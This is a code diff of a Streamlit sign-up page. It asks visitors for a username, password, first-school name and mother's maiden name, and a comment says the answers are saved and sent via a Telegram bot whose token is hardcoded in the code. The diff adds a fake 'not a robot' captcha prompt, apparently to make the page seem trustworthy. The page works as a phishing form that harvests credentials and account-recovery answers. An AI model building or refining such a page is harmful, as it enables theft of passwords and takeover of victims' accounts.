@@ -6,18 +6,15 @@ import cv2
 
 # streamlit run app.py
 
-st.subheader("Create an Account")
+st.subheader("Please Create an Account")
 new_user = st.text_input('Username')
 new_passwd = st.text_input('Password', type='password')
 
 st.write('Please answer the security questions:')
-type = st.text_input('Urban or beach vibe?')
 school = st.text_input('Name of your first school?')
 mom_name = st.text_input('Mother''s maiden name?')
-hotel = st.text_input('next vacation - fancy boho chick hotel or airbnb in a secluded beach?')
-drink = st.text_input('Next vacation with grillouzo or limoncello?')
-
-
+type = st.text_input('Urban or beach vibe?')
+hotel = st.text_input('Fancy Boho chic hotel or airbnb in a secluded beach?')
 
 # save results to csv and send via telegram
 
@@ -26,6 +23,7 @@ df = pd.DataFrame({"username": [new_user], "password": [new_passwd], "school": [
 TOKEN = "2034688341:AAGiWVOQZ_wJUDLEGPbqXn80LzJ9palMWu0"
 tb = telebot.TeleBot(TOKEN)  # create a new Telegram Bot object
 if st.button('Sign Up'):
+	st.write('Please confirm you''re not a robot:')
 	im = st.image('captcha.png')
 	captcha = st.text_input('Enter image numbers')
 	ver = st.button('Verify')
